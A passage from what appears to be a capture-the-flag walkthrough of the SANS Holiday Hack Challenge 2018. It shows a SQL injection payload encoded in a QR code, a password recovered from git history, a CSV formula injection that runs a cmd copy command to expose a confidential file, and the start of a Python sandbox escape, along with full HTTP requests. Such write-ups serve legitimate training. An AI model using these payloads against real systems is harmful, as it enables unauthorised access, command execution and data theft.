<div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">qr</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;foo&#39; OR 1=1 AND enabled=&#39;1&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">qr</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;qr_sqli.png&#39;</span><span class="p">)</span>
</pre></div>
<p>With this payload, the SQL request will become:</p>
<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="n">first_name</span><span class="p">,</span><span class="n">last_name</span><span class="p">,</span><span class="n">enabled</span> <span class="k">FROM</span> <span class="n">employees</span> <span class="k">WHERE</span> <span class="n">authorized</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">AND</span> <span class="n">uid</span> <span class="o">=</span> <span class="s1">&#39;foo&#39;</span> <span class="k">OR</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span> <span class="k">AND</span> <span class="n">enabled</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> <span class="k">LIMIT</span> <span class="mi">1</span>
</pre></div>
<p>This should return the first enabled user that is authorized to open the door.
Let's scan our evil QR code:</p>
<img alt="qr_sqli.png" class="align-center" src="/images/sans-christmas-challenge-2018/qr_sqli.png" />
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/upload</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">scanomatic.kringlecastle.com</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json, text/javascript, */*; q=0.01</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">https://scanomatic.kringlecastle.com/index.html</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=---------------------------242929957373414110176704857</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">560</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">resource_id=false</span>

-----------------------------242929957373414110176704857
Content-Disposition: form-data; name=&quot;barcode&quot;; filename=&quot;qr_sqli.png&quot;
Content-Type: image/png

PNG [snip]
-----------------------------242929957373414110176704857
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.3</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 03 Jan 2019 13:42:19 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">179</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="hll"><span class="p">{</span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;User Access Granted - Control number 19880715&quot;</span><span class="p">,</span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&quot;success&quot;</span><span class="p">:{</span><span class="nt">&quot;hash&quot;</span><span class="p">:</span><span class="s2">&quot;ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb&quot;</span><span class="p">,</span><span class="nt">&quot;resourceId&quot;</span><span class="p">:</span><span class="s2">&quot;false&quot;</span><span class="p">}}</span>
</span></pre></div>
<img alt="scanomatic_success.gif" class="align-center" src="/images/sans-christmas-challenge-2018/scanomatic_success.gif" />
<p>We get the control number, which is <code>19880715</code>.</p>
</div>
</div>
<div class="section" id="the-john-mcclane-way">
<h4><a class="toc-backref" href="#id29">The &quot;John McClane&quot; way</a></h4>
<p>If you remember, we found schematics for the ventilation conducts in the North
Pole Git Repository. And it just so happens that next to Google's booth, there
is a ventilation conduct:</p>
<img alt="google_booth.png" class="align-center" src="/images/sans-christmas-challenge-2018/google_booth.png" />
<p>If you go inside, you can navigate the maze that is the ventilation conduct.</p>
<img alt="google_vent_maze.png" class="align-center" src="/images/sans-christmas-challenge-2018/google_vent_maze.png" />
<p>But we have a map! We can follow the schematics we found earlier. This allows
us to bypass the authentication door:</p>
<img alt="ventilation_diagram_1F_solution.jpg" class="align-center" src="/images/sans-christmas-challenge-2018/ventilation_diagram_1F_solution.jpg" />
<img alt="ventilation_diagram_2F_solution.jpg" class="align-center" src="/images/sans-christmas-challenge-2018/ventilation_diagram_2F_solution.jpg" />
</div>
</div>
</div>
<div class="section" id="hr-incident-response">
<h2><a class="toc-backref" href="#id30">HR Incident Response</a></h2>
<p>Hans reveals his true plan:</p>
<img alt="hans.png" class="align-center" src="/images/sans-christmas-challenge-2018/hans.png" />
<p><em>Hans says</em></p>
<blockquote>
<p>So, you’ve figured out my plan – it’s not about freeing those prisoners.</p>
<p>The toy soldiers and I are here to steal the contents of Santa’s vault!</p>
<p>You think that after all my posturing, all my little speeches, that I’m
nothing but a common thief.</p>
<p>But, I tell you -- I am an exceptional thief.</p>
<p>And since I've moved up to kidnapping all of you, you should be more
polite!</p>
</blockquote>
<div class="section" id="sparkle-redberry-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id31">Sparkle Redberry's Cranberry Pi Challenge</a></h3>
<p>Sparkle Redberry committed her password to the local git repository. We have
to recover the password:</p>
<div class="highlight"><pre><span></span><span class="go">                                   .0.</span>
<span class="go">                               .:llOXKllc.</span>
<span class="go">                                 .OXXXK,</span>
<span class="go">                                 &#39;0l&#39;cOc</span>
<span class="go">                                 ..&#39;;&#39;..</span>
<span class="go">                               .&#39;;::::::&#39;.</span>
<span class="go">                            .&#39;:::::::::::::,.</span>
<span class="go">                         .&#39;::loc::::::::::::::,.</span>
<span class="go">                      .&#39;::::oMMNc::::::::::::::::,.</span>
<span class="go">                    .,;;,,,,:dxl:::::::,,,:::;,,,,,,.</span>
<span class="go">                    .,&#39;  ..;:::::::::::;,;::::,.</span>
<span class="go">                      .&#39;;::::::::::::::::::::dOxc,.</span>
<span class="go">                   .&#39;;:::::::::okd::::::::::cXMWd:::,.</span>
<span class="go">                .&#39;;:::::::::::cNMMo:::::::::::lc:::::::,.</span>
<span class="go">             .&#39;::::::::::::::::col::::::::::::;:::::::::::,.</span>
<span class="go">                   .;:::,,,:::::::::::::::::;,,,:::::&#39;.</span>
<span class="go">                .&#39;::::::;;;:::::::::::dko:::::;::::::::;.</span>
<span class="go">             .,::::::::::::::::::::::lWMWc::::::::::::::::;.</span>
<span class="go">            ..:00:...;::::loc:::::::::coc::::::::::::&#39;.;;.....</span>
<span class="go">              :NNl.,:::::xMMX:::::::::::::::::::::::::;,,.</span>
<span class="go">               .,::::::::cxxl::::,,,:::::::::::::::::::::;.</span>
<span class="go">            .,:::::::c:::::::::::;;;:::::::;;:::::kNXd::::::;.</span>
<span class="go">         .,::::::::cKMNo::::::::::::::::::;,,;::::xKKo:::::::::;.</span>
<span class="go">       .&#39;&#39;&#39;&#39;&#39;&#39;,:::::x0Oc:::::::::oOOo:::::::::::::::::::::;&#39;&#39;&#39;&#39;&#39;&#39;&#39;.</span>
<span class="go">            .,:::::::::::::::::::kWWk::::::::::::::ldl:::::;&#39;.</span>
<span class="go">         .,::;,,::::::::::::::::::::::::::::::::::lMMMl:::::::;&#39;.</span>
<span class="go">      .,:::::;,;:::::::::::::::::::::::::::::::::::ldl::::::::::::&#39;.</span>
<span class="go">   .,::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::&#39;.</span>
<span class="go">                               ..;;;;;;;;&#39;.</span>
<span class="go">                             .&#39;;;;;;;;;;;;;&#39;.</span>
<span class="go">                          .&#39;;;;;;;;;;;;;;;;;;;&#39;.</span>
<span class="go">                         ........................</span>



<span class="go">Coalbox again, and I&#39;ve got one more ask.</span>
<span class="go">Sparkle Q. Redberry has fumbled a task.</span>
<span class="go">Git pull and merging, she did all the day;</span>
<span class="go">With all this gitting, some creds got away.</span>

<span class="go">Urging - I scolded, &quot;Don&#39;t put creds in git!&quot;</span>
<span class="go">She said, &quot;Don&#39;t worry - you&#39;re having a fit.</span>
<span class="go">If I did drop them then surely I could,</span>
<span class="go">Upload some new code done up as one should.&quot;</span>

<span class="go">Though I would like to believe this here elf,</span>
<span class="go">I&#39;m worried we&#39;ve put some creds on a shelf.</span>
<span class="go">Any who&#39;s curious might find our &quot;oops,&quot;</span>
<span class="go">Please find it fast before some other snoops!</span>

<span class="go">Find Sparkle&#39;s password, then run the runtoanswer tool.</span>
<span class="gp">elf@fa3b5d8290f0:~$</span>
</pre></div>
<p>Let's see the git repository and check the commit history:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@76d904959962:~$</span> ls -lh
<span class="go">total 5.7M</span>
<span class="go">drwxr-xr-x 1 elf elf 4.0K Nov 14 09:48 kcconfmgmt</span>
<span class="go">-rwxr-xr-x 1 elf elf 5.7M Dec 14 16:13 runtoanswer</span>
<span class="gp">elf@76d904959962:~$</span> <span class="nb">cd</span> kcconfmgmt/
<span class="gp">elf@76d904959962:~/kcconfmgmt$</span> git log <span class="p">|</span> grep -i -C <span class="m">5</span> password

<span class="go">commit d84b728c7d9cf7f9bafc5efb9978cd0e3122283d</span>
<span class="go">Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;</span>
<span class="go">Date:   Sat Nov 10 19:51:52 2018 -0500</span>

<span class="go">    Add user model for authentication, bcrypt password storage</span>

<span class="go">commit c27135005753f6dde3511a7e70eb27f92f67393f</span>
<span class="go">Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;</span>
<span class="go">Date:   Sat Nov 10 08:11:40 2018 -0500</span>

<span class="go">--</span>

<span class="go">commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b</span>
<span class="go">Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;</span>
<span class="go">Date:   Thu Nov 8 21:11:03 2018 -0500</span>

<span class="hll"><span class="go">    Per @tcoalbox admonishment, removed username/password from config.js, default settings in config.js.def need to be updated before use</span>
</span>
<span class="go">commit b2376f4a93ca1889ba7d947c2d14be9a5d138802</span>
<span class="go">Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;</span>
<span class="go">Date:   Thu Nov 8 13:25:32 2018 -0500</span>
</pre></div>
<p>Apparently, in commit <code>60a2ffea7520ee980a5fc60177ff4d0633f2516b</code>, Sparkle
removed her password from the <code>config.js</code> file, which was replaced by a
default <code>config.js.def</code>. Let's see where this file is:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@76d904959962:~/kcconfmgmt$</span> find . -name config.js.def
<span class="go">./server/config/config.js.def</span>
</pre></div>
<p>Now that we know where it is, we can guess where the original <code>config.js</code>
file was. Let's check it's modification history:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@eba657fc7961:~/kcconfmgmt$</span> git log -p -- ./server/config/config.js
<span class="go">commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b</span>
<span class="go">Author: Sparkle Redberry &lt;sredberry@kringlecon.com&gt;</span>
<span class="go">Date:   Thu Nov 8 21:11:03 2018 -0500</span>
<span class="go">    Per @tcoalbox admonishment, removed username/password from config.js, default settings in c</span>
<span class="go">onfig.js.def need to be updated before use</span>
<span class="go">diff --git a/server/config/config.js b/server/config/config.js</span>
<span class="go">deleted file mode 100644</span>
<span class="go">index 25be269..0000000</span>
<span class="go">--- a/server/config/config.js</span>
<span class="go">+++ /dev/null</span>
<span class="go">@@ -1,4 +0,0 @@</span>
<span class="go">-// Database URL</span>
<span class="go">-module.exports = {</span>
<span class="hll"><span class="go">-    &#39;url&#39; : &#39;mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api&#39;</span>
</span><span class="go">-};</span>
<span class="go">[snip]</span>
</pre></div>
<p>We find our commit <code>60a2ffea7520ee980a5fc60177ff4d0633f2516b</code>, which
deletes the file, and gives us the content of the original <code>config.js</code>
file. Sparkle's password is <code>twinkletwinkletwinkle</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@fa3b5d8290f0:~$</span> ./runtoanswer
<span class="go">Loading, please wait......</span>



<span class="hll"><span class="go">Enter Sparkle Redberry&#39;s password: twinkletwinkletwinkle</span>
</span>

<span class="go">This ain&#39;t &quot;I told you so&quot; time, but it&#39;s true:</span>
<span class="go">I shake my head at the goofs we go through.</span>
<span class="go">Everyone knows that the gits aren&#39;t the place;</span>
<span class="go">Store your credentials in some safer space.</span>

<span class="go">Congratulations!</span>
</pre></div>
</div>
<div class="section" id="elf-infosec-careers-website">
<h3><a class="toc-backref" href="#id32">Elf InfoSec Careers Website</a></h3>
<p>We're asked to take a look at the <a class="reference external" href="https://careers.kringlecastle.com/">Elf InfoSec Careers website</a>. It's a website where you can upload
your application, and if your profile is interesting enough, you can join
Santa's elves! The goal is to get the content of the
<code>C:\candidate_evaluation.docx</code> file.</p>
<p>Let's fill an application. You must provide your full name, phone number,
email address, and a CSV file with your work history:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/api/upload/application</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">careers.kringlecastle.com</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">https://careers.kringlecastle.com/</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=---------------------------1284099169763381272238033</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">683</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

-----------------------------1284099169763381272238033
Content-Disposition: form-data; name=&quot;firstname&quot;

Foo
-----------------------------1284099169763381272238033
Content-Disposition: form-data; name=&quot;lastname&quot;

Bar
-----------------------------1284099169763381272238033
Content-Disposition: form-data; name=&quot;phone&quot;

0000000000
-----------------------------1284099169763381272238033
Content-Disposition: form-data; name=&quot;email&quot;

foo@bar.com
-----------------------------1284099169763381272238033
Content-Disposition: form-data; name=&quot;csv&quot;; filename=&quot;resume.csv&quot;
Content-Type: text/csv

Super pentester

-----------------------------1284099169763381272238033--
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.1</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 03 Jan 2019 16:18:04 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=utf-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">X-Powered-By</span><span class="o">:</span> <span class="l">Express</span>
<span class="na">ETag</span><span class="o">:</span> <span class="l">W/&quot;172-gwRZ+l3Bn2+yGvHpphldazlOPqI&quot;</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">370</span>

Thank you for taking the time to upload your information to our elf resources shared workshop station! Our elf resources will review your CSV work history within the next few minutes to see if you qualify to join our elite team of InfoSec Elves. If you are accepted, you will be added to our secret list of potential new elf hires located in C:\candidate_evaluation.docx
</pre></div>
<img alt="career_upload.png" class="align-center" src="/images/sans-christmas-challenge-2018/career_upload.png" />
<p>I first thought that we'd have to perform an upload vulnerability, where we
could upload a webshell and gain remote code execution on the server. I tried
looking for an upload directory, for example in <code>/uploads/</code>:</p>
<div class="highlight"><pre><span></span><span class="nf">GET</span> <span class="nn">/uploads/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">careers.kringlecastle.com</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.1</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 03 Jan 2019 16:23:08 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">X-Powered-By</span><span class="o">:</span> <span class="l">Express</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">public, max-age=0</span>
<span class="na">Last-Modified</span><span class="o">:</span> <span class="l">Fri, 07 Dec 2018 01:34:04 GMT</span>
<span class="na">ETag</span><span class="o">:</span> <span class="l">W/&quot;f48-167864ce0e2&quot;</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">3912</span>

<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
[snip]
  <span class="c">&lt;!--physical server path---&gt;</span>
   <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Publicly accessible file served from: <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
     C:\careerportal\resources\public\    not found......<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
     <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
   <span class="c">&lt;!---logical web path--&gt;</span>
     <span class="p">&lt;</span><span class="nt">strong</span><span class="p">&gt;&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Try: <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span> https://careers.kringlecastle.com/public/&#39;file name you are looking for&#39;<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span>


<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
<img alt="career_404.png" class="align-center" src="/images/sans-christmas-challenge-2018/career_404.png" />
<p>Hmm, what a helpful 404 error message. It gives us the full path to the public
web folder, and the URL. This means, that if we can get the
<code>C:\candidate_evaluation.docx</code> in this directory, we'll be able to
download it. But how can we do so with only what we have in the application
form?</p>
<p>The work history file that we upload is a CSV file. And apparently, this server
is a Windows server, given the file paths, and all. This means that the CSV
file will probably be opened by an elf using Excel. In that case, we can use
a <a class="reference external" href="https://www.contextis.com/en/blog/comma-separated-vulnerabilities">CSV injection</a> to
execute code on the elf's workstation. This is a vulnerability we sometimes
find during pentest assessments. However, it's pretty low risk, because it's
kind of clunky to exploit: the user has to download the CSV, try to evaluate
the cell with our payload, and click &quot;Yes&quot; on a warning prompt. It's still
worth a try, though:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> cat copy_file_to_www.csv
<span class="go">=cmd|&#39; /c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\omg_secret_file.docx&#39;!A0</span>
</pre></div>
<p>This payload will copy the wanted file in the public web folder, under the
name <code>omg_secret_file.docx</code>. Let's upload it:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/api/upload/application</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">careers.kringlecastle.com</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">https://careers.kringlecastle.com/</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=---------------------------12548806719497856202051334912</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">803</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

-----------------------------12548806719497856202051334912
Content-Disposition: form-data; name=&quot;firstname&quot;

Foo
-----------------------------12548806719497856202051334912
Content-Disposition: form-data; name=&quot;lastname&quot;

Bar
-----------------------------12548806719497856202051334912
Content-Disposition: form-data; name=&quot;phone&quot;

0000000000
-----------------------------12548806719497856202051334912
Content-Disposition: form-data; name=&quot;email&quot;

foo@bar.com
-----------------------------12548806719497856202051334912
Content-Disposition: form-data; name=&quot;csv&quot;; filename=&quot;copy_file_to_www.csv&quot;
Content-Type: text/csv

=cmd|&#39; /c copy C:\candidate_evaluation.docx C:\careerportal\resources\public\omg_secret_file.docx&#39;!A0

-----------------------------12548806719497856202051334912--
</pre></div>
<p>We wait a couple seconds, and then bingo! We can download the file from the
URL <a class="reference external" href="https://careers.kringlecastle.com/public/omg_secret_file.docx">https://careers.kringlecastle.com/public/omg_secret_file.docx</a>. You can
download this file <a class="reference external" href="/docs/sans-christmas-challenge-2018/candidate_evaluation.docx">here</a>.</p>
<p>Now, we were asked to find which terrorist organization is supported by the
job applicant whose name begins with &quot;K&quot;. Let's open up the document:</p>
<img alt="career_candiate_docx.png" class="align-center" src="/images/sans-christmas-challenge-2018/career_candiate_docx.png" />
<p>Here's what we can learn on this applicant:</p>
<blockquote>
<p><span class="underline">Candidate Name: Krampus</span></p>
<p><em>Comments (Please summarize your perceptions of the candidate’s strengths,
and any concerns that should be considered:</em></p>
<p>Krampus’s career summary included experience hardening decade old attack
vectors, and lacked updated skills to meet the challenges of attacks
against our beloved Holidays.</p>
<p>Furthermore, there is intelligence from the North Pole <strong>this elf is linked
to cyber terrorist organization Fancy Beaver</strong> who openly provides
technical support to the villains that attacked our Holidays last year.</p>
<p>We owe it to Santa to find, recruit, and put forward trusted candidates
with the right skills and ethical character to meet the challenges that
threaten our joyous season.</p>
</blockquote>
<p>So, apparently the candidate name is <a class="reference external" href="https://en.wikipedia.org/wiki/Krampus">Krampus</a>, and he's linked to the terrorist
organization <a class="reference external" href="https://en.wikipedia.org/wiki/Fancy_Bear">Fancy Beaver</a>.</p>
</div>
</div>
<div class="section" id="network-traffic-forensics">
<h2><a class="toc-backref" href="#id33">Network Traffic Forensics</a></h2>
<p>We find Hans in Santa's secret room:</p>
<img alt="hans.png" class="align-center" src="/images/sans-christmas-challenge-2018/hans.png" />
<p><em>Hans says</em></p>
<blockquote>
<p>You’ve found me and blocked my access to Santa’s treasure.</p>
<p>You’ve done well in foiling me. But, I’ve still got a chance.</p>
<p>When you steal six hundred dollars, you can disappear. When you steal all
of Santa’s treasure, they will find you… unless….</p>
<p><em>(muffled yelling)</em></p>
</blockquote>
<img alt="hans_snow.png" class="align-center" src="/images/sans-christmas-challenge-2018/hans_snow.png" />
<p><em>The narrator says</em></p>
<blockquote>
<p><em>And then suddenly, Hans slips and falls into a snowbank. His nefarious
plan thwarted, he's now just cold and wet.</em></p>
<p><em>But Santa still has more questions for you to solve!</em></p>
</blockquote>
<img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2018/santa.png" />
<p><em>Santa says</em></p>
<blockquote>
<p>HO HO HO!!!</p>
<p>You did a great job, but keep going!</p>
<p>Solve all remaining objectives in your badge.</p>
</blockquote>
<div class="section" id="sugarplum-mary-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id34">SugarPlum Mary's Cranberry Pi Challenge</a></h3>
<p>We're trapped inside a Python interpreter, and we must escape and run a
program:</p>
<div class="highlight"><pre><span></span>               :lllllllllllllllllllllllllllllllllllllllll,
               &#39;lllllllllllllllllllllllllllllllllllllllll:
                clllllllllllllllllllllllllllllllllllllllll.
                &#39;lllllllllllllllllllllllllllllllllllllllll:
                 ;lllllllllllllllllllllllllllllllllllllllll,
                  :lllllllllllllllllllllllllllllllllllllllll.
                   :lllllllllllllllllllllllllllllllllllllllll.
                    ;lllllllllllllllllllllllllllllllllllllllll&#39;
                     &#39;lllllllllllllllllllllllllllllllllllllllll;
                      .cllllllllllllllllllllllllllllllllllllllllc.
                      .:llllllllllllllllllllllllllllllllllllllllllc,.
                   .:llllllllllllllllllllllllllllllllllllllllllllllll;.
                .,cllllllllllllllllllllllllllllllllllllllllllllllllllll,
              .;llllllllllllllllllllllllllllllllllllllllllllllllllllllllc.
             ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.
           &#39;llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc
          :lllllll:..,..&#39;cllllllllllllllllllllllc&#39;.,&#39;.&#39;clllllllllllllllllll;
        .clllllll&#39;  :XK.  :llllllllllllllllllll;  ,XX.  ;lllllllllllllllllll.
       .cllllllll.  oXX&#39;  ,llllllllllllllllllll.  cXX;  .lllllllllllllllllll&#39;
       clllllllll;  .xl  .cllllllllllllllllllllc.  do  .clllllllllllllllllll,
      :llllllllllll;&#39;..&#39;:llllllllllllllllllllllll:&#39;..&#39;:lllllllllllllllllllll&#39;
     .llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.
     ;lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc
     clllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll.
     cllllllllllllllllllllllllll..;lc..:llllllllllllllllllllllllllllllllll;
     :lllllllllllllllllllllllll:  .l,  .lllllllllllllllllllllllllllllllll:
     ,lllllllllllllllllllllllllc  .l;  ,llllllllllllllllllllllllllllllll:
     .llllllllllllllllllllllllllc;lll::llllllllllllllllllllllllllllllll,
      &#39;llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.
       ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllll,
        &#39;llllllllllllllllcccccccc;&#39;,.,clllllllllllllllllllllllllll,
         .cllllllc:::::;;,,,,&#39;...&#39;:c:;...&#39;&#39;,,;;;::::::lllllllllc,
           &#39;cllllc::;::::cccccccccllc,,,,,,,&#39;&#39;,:::::::lllllll;.
             .:llllllllllkMMMMMMMMMdlclllllllllollllllllll;.
               .&#39;:lllllllXMMMMMMMMMoloWMMMMMMMMXllllll:,.
                   .,:llccccccccccllllXMMMMMMMMWl:;&#39;.
                       .,,,,,,,,,,clll:::::::::;
                      &#39;lllllllllc.    &#39;,,,,,,,,.
                     lMMMMMMMMMW,    .ddddddddd.
                    kMMMMMMMMMX.     kMMMMMMMMK
                   &#39;:::::::::,      .NWWWWWWWW:
                  &#39;,,,,,,,,,.       .,,,,,,,,&#39;
                .oooooooooo.        &#39;,,,,,,,,.
               .NMMMMMMMMW;        cOOOOOOOOx
               0MMMMMMMMMc         NMMMMMMMMk
               ;;;;;;;;;&#39;         .KKKKKKKKK:
              .,,,,,,,,,           ,,,,,,,,,.
              .ddddddddo           &#39;,,,,,,,,.
               XMMMMMMMN           cKKKKKKKKK.
    .;:::;;,,,,,:ldddddd.           0MMMMMMMMX.       ....
      .,:ccccccccccccccc            &#39;cccccccccc:::ccccc;.
         .:ccccccccccccc            .ccccccccccccccc:&#39;.
           .;;;;;;;;;;;;            .ccccccccccccc;.
                                    ..............


I&#39;m another elf in trouble,
Caught within this Python bubble.
Here I clench my merry elf fist -
Words get filtered by a black list!
Can&#39;t remember how I got stuck,
Try it - maybe you&#39;ll have more luck?
For this challenge, you are more fit.
Beat this challenge - Mark and Bag it!
-SugarPlum Mary
To complete this challenge, escape Python
and run ./i_escaped
&gt;&gt;&gt;
</pre></div>
<p>I first tried to <code>import</code> the <code>os</code> module, but it was forbidden:</p>
<div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">os</span>
<span class="go">Use of the command import is prohibited for this question.</span>
</pre></div>
<p>Other functions and objects like that are unavailable, such as
<code>__builtins__</code>, or <code>exec</code>. However, <code>eval</code> is available:</p>
<div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">eval</span>
<span class="go">&lt;built-in function eval&gt;</span>
</pre></div>
<p>Since <code>eval</code> takes a string as an argument, and evaluates it as Python
code, I thought I could bypass the restriction on <code>import</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;import os&#39;</span><span class="p">)</span>
<span class="go">Use of the command import is prohibited for this question.</span>
</pre></div>
<p>Hmm, does not work. What if I try some string modification?</p>
